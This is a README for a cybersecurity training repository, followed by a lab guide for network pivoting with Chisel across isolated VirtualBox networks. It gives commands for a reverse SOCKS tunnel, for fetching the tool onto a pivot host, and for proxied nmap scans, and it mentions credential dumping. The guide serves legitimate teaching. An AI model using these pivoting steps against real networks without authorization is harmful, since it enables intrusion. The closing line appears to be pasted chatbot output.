# cyberGoat
cyberGoat — a hands-on, instructor-ready cybersecurity course repo with 10 practical modules (networking, web pentesting, cloud, Active Directory, Kubernetes, malware analysis, SOC ops). Includes step-by-step labs, Docker/Vagrant setups, tool install scripts, exploit walkthroughs, and student/instructor templates for safe classroom labs..



# CyberGoat — Advanced Cybersecurity Labs & Training Repository

<p align="center">
  <img src="https://github.com/shaaiir/cyberGoat/blob/main/cybergoat1.png" width="320" style="border-radius:12px; display:block; margin:0 auto 12px;" />
</p>
<p align="center">
<img src="https://github.com/shaaiir/cyberGoat/blob/main/cybergoat2.png" width="320" style="border-radius:12px; display:block; margin:0 auto;" />
</p>
---

### About CyberGoat
**CyberGoat** is a complete, practical cybersecurity training repository featuring 10 hands-on modules — covering networking, web app pentesting, cloud security, Active Directory attacks, Kubernetes, malware analysis, SOC operations, and more.  
Each module includes detailed labs, Docker/Vagrant setups, tools, exploit demos, and instructor/student templates for structured learning.

---

### 🧩 Modules Overview
1. Core Foundations  
2. Proxy, Reverse Proxy & Network Cloaking  
3. Cloud Pentesting (AWS, Azure, GCP)  
4. Pivoting, Tunneling, Proxying  
5. Active Directory & Internal Exploitation  
6. Kubernetes & Container Security  
7. Social Engineering  
8. Malware Analysis & Reverse Engineering  
9. Blue Team, SOC & Splunk  
10. Web Application Penetration Testing 

---

### 💡 Vision
Empower students and professionals to **learn cybersecurity by doing** — through reproducible, legal, and realistic lab environments.

---

> 🧑‍💻 Built and maintained by **Shahir Ali**  
> 🌐 [GitHub Profile](https://github.com/shaaiir)






Objective: Build a strong practical foundation in networking, operating systems, and offensive methodology. By the end of this module students will be able to: understand and manipulate TCP/IP and OSI layers, perform subnetting and VLAN analysis, enumerate and exploit OS weaknesses, perform post-exploitation, and follow a structured pentesting methodology mapped to MITRE ATT&CK and the Cyber Kill Chain.



# Module 01 — Core Foundations: Pivoting Lab Setup

## Objective
Build a **strong practical foundation** in networking, operating systems, and offensive methodology. By the end of this module, students will be able to:

- Understand and manipulate **TCP/IP and OSI layers**.
- Perform **subnetting and VLAN analysis**.
- Enumerate and exploit **operating system weaknesses**.
- Conduct **post-exploitation** and **pivoting** using tunneling tools like **Chisel**.
- Follow a structured **penetration testing methodology** mapped to **MITRE ATT&CK** and the **Cyber Kill Chain**.

***

## Lab Overview: Network Pivoting with Chisel
You’ll build a **multi-network lab environment** using **VirtualBox** to simulate network isolation and penetration testing scenarios.

### Machines Setup
| Role | OS | Purpose |
|------|----|----------|
| Attacker | Kali Linux | Primary attack and control machine |
| Pivot | Ubuntu Linux | Dual-homed host bridging two NAT networks |
| Internal Linux Host | Debian/Ubuntu | Target in internal subnet |
| Internal Windows Host | Windows 10 | Target in internal subnet |

***

## Step 1 — VirtualBox Network Configuration
1. **Create two NAT Networks**:
   - **NATNetwork1:** `10.0.10.0/24` — attacker and pivot connected here.
   - **NATNetwork2:** `10.0.20.0/24` — pivot, internal Linux, and Windows hosts connected here.

2. **Configure adapters:**
   - **Kali:** Single adapter → NATNetwork1.
   - **Pivot (Ubuntu):** Two adapters → NATNetwork1 and NATNetwork2 (dual NIC).
   - **Linux target:** Single adapter → NATNetwork2.
   - **Windows target:** Single adapter → NATNetwork2.

👉 Verify connectivity with `ping`:
- Kali ↔ Pivot ✅
- Pivot ↔ Internal hosts ✅
- Kali ↔ Internal hosts ❌ (blocked — will pivot later)

***

## Step 2 — Configure the Kali Attacker Machine

1. **Install tools:**
   ```bash
   sudo apt update && sudo apt install chisel proxychains4 -y
   ```

2. **Edit proxychains configuration:**
   ```bash
   sudo nano /etc/proxychains4.conf
   ```
   Add at the bottom:
   ```
socks5  127.0.0.1 1080
   ```

3. Start listening for reverse traffic:
   ```bash
   ./chisel server -p 8080 --reverse
   ```

   This will allow reverse connections from the pivot host.

***

## Step 3 — Upload and Run Chisel on Pivot Host (Ubuntu)

1. **Transfer Chisel:**
   Use a simple Python HTTP server on Kali:
   ```bash
   python3 -m http.server 8000
   ```
   Then on the pivot:
   ```bash
   wget http://<kali_ip>:8000/chisel
   chmod +x chisel
   ```

2. **Run Chisel Client (Reverse Connection):**
   ```bash
   ./chisel client <kali_ip>:8080 R:socks
   ```
   This creates a SOCKS proxy from pivot → attacker.

***

## Step 4 — Verify Proxy and Pivot Access

1. **Check connectivity** from Kali through proxychains:
   ```bash
   proxychains nmap -sT 10.0.20.0/24
   ```
   You should see open ports of the internal Linux and Windows machines.

2. Your traffic is now tunneled through the Pivot host using Chisel.

***

## Step 5 — Advanced: Double Pivot (Optional)

To demonstrate **deep network traversal**, you can add another internal machine on a third subnet and chain Chisel tunnels, as described in HTB’s double pivot guide. This allows multi-hop access similar to real enterprise environments.

***

## Step 6 — Post-Exploitation Workflow

Use this setup to practice:
- **Enumerating internal networks** with tools like `nmap` and `smbclient`.
- **Credential dumping** and **lateral movement** simulations.
- Applying **MITRE ATT&CK stages**, from Initial Access to Execution and Persistence.

***

## Step 7 — Reflection & Documentation

Document:
- Network map diagrams.
- Chisel commands used.
- Verification results (connectivity tests, successful scans).
- Lessons learned about traffic tunneling and segmentation.

***

### Summary
After completing this module, you’ll understand:
- How to configure and isolate virtual networks.
- The purpose and power of network pivoting.
- How tools like **Chisel** enable controlled tunneling and SOCKS proxy access.
- How pivoting integrates into the **post-exploitation** stage of a penetration test.

If you tell me whether this module is for your **personal lab** or **structured training curriculum**, I can tailor the terminology, exercises, and difficulty level accordingly.

[1](https://forum.hackthebox.com/t/attacking-enterprise-networks-double-pivot-using-chisel/267043)
[2](https://www.bokehsolutions.com/component/content/article/network-pivoting-with-chisel.html?catid=12&Itemid=101)
[3](https://www.youtube.com/watch?v=pbR_BNSOaMk)
[4](https://www.dedoimedo.com/computers/virtualbox-nat-networks.html)
[5](https://www.youtube.com/watch?v=pBG4xSpUTlc)
[6](https://www.hackingarticles.in/chisel-port-forwarding-a-detailed-guide/)
[7](https://www.youtube.com/watch?v=hBXFJP6YDgY)
